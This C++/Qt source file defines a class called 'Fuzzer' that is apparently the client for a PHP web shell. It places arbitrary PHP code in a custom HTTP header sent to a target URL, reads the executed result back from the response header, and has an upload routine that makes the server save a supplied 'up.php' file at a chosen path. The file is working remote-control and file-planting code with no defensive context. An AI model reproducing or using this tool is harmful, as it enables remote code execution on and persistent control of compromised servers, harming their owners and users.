#include "Fuzzer.h"

#include <QNetworkReply>
#include <QNetworkAccessManager>
#include <QNetworkRequest>

#include <QHttpPart>
#include <QFile>

#include <QEventLoop>

#include <QMessageBox>

Fuzzer::Fuzzer(QObject *parent, QString h, QString u) : QObject(parent)
{
    this->header = h;
    this->url = u;
    this->error = false;
    this->response = "WAIT";
    this->gManager = new QNetworkAccessManager(this);
}

QString Fuzzer::normalizeRequest(QString r) {
    QString headerResponse = "header('" + this->header + ":' . urlencode($r));";
    return r + headerResponse;
}

void Fuzzer::sendRequest(QString r)
{
    this->request = normalizeRequest(r);

    QNetworkRequest nRequest;
    nRequest.setUrl(QUrl(url));
    nRequest.setRawHeader(header.toLatin1(), request.toLatin1());

    QNetworkReply *nReply;
    nReply = gManager->get(nRequest);

    connect(nReply, SIGNAL(downloadProgress(qint64, qint64)), parent(), SLOT(progressUpdate(qint64, qint64)));
    connect(nReply, SIGNAL(error(QNetworkReply::NetworkError)), this, SLOT(handleError(QNetworkReply::NetworkError)), Qt::UniqueConnection);
    connect(nReply, SIGNAL(finished()), this, SLOT(handleReturn()), Qt::UniqueConnection);
}

QString Fuzzer::uploadFile(QString name, QString localPath, QString serverPath)
{
    QByteArray postData;
    postData = buildUploadString(name, localPath);

    QString bound = "margin"; //name of the boundary

    QString request = "$d='"+serverPath+"';if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $d)){$r='Success!';}else{$r='Error!';}";
    request = normalizeRequest(request);

    QNetworkRequest nRequest;
    nRequest.setUrl(QUrl(url));
    nRequest.setRawHeader(QString("Content-Type").toLatin1(),QString("multipart/form-data; boundary=" + bound).toLatin1());
    nRequest.setRawHeader(QString("Content-Length").toLatin1(), QString::number(postData.length()).toLatin1());
    nRequest.setRawHeader(header.toLatin1(), request.toLatin1());

    connect(gManager, SIGNAL(finished(QNetworkReply*)), this, SLOT(httpRequestFinished(QNetworkReply*)));

    gManager->post(nRequest, postData);

    return "Smth";
}

QByteArray Fuzzer::buildUploadString(QString name, QString localPath)
{
    QString bound="margin";
    QByteArray data(QString("--" + bound + "\r\n").toLatin1());
    data.append("Content-Disposition: form-data; name=\"action\"\r\n\r\n");
    data.append("uploadFile.php\r\n");
    data.append(QString("--" + bound + "\r\n").toLatin1());
    data.append("Content-Disposition: form-data; name=\"uploaded\"; filename=\"up.php\"");
    data.append(name);
    data.append("\"\r\n");
    data.append("Content-Type: text/xml\r\n\r\n"); //data type

    QFile file(localPath);
    if (!file.open(QIODevice::ReadOnly)){
        qDebug() << "QFile Error: File not found!";
        return data;
    } else { qDebug() << "File found, proceed as planned"; }

    data.append(file.readAll());
    data.append("\r\n");
    data.append("--" + bound + "--\r\n");  //closing boundary according to rfc 1867

    file.close();

    return data;
}

void Fuzzer::httpRequestFinished(QNetworkReply *reply) {
    if (reply->error() == QNetworkReply::NoError)
    {
        qDebug() << "Body : " << reply->readAll();
        qDebug() << "Header : " << reply->rawHeader("Nes");
    }

    reply->deleteLater();
}

void Fuzzer::handleReturn()
{
    QNetworkReply* reply = qobject_cast<QNetworkReply*>(sender());

    if(reply->error() == QNetworkReply::NoError)
    {
        response = reply->rawHeader(header.toLatin1());
        response = QUrl::fromPercentEncoding(response.toLatin1());
        //response = "api ||| perl.php"; //Bouchon
    }

    reply->deleteLater();

    emit finishRequest();
}

void Fuzzer::handleError(QNetworkReply::NetworkError)
{
    QNetworkReply *r = qobject_cast<QNetworkReply*>(sender());

    QMessageBox msg;
    msg.setIcon(msg.Critical);
    msg.setText("Erreur lors du chargement : " + r->errorString());
    msg.exec();

    this->response = "ERROR";
}

QString Fuzzer::getResponse()
{
    return this->response;
}

QString Fuzzer::getRequest()
{
    return this->request;
}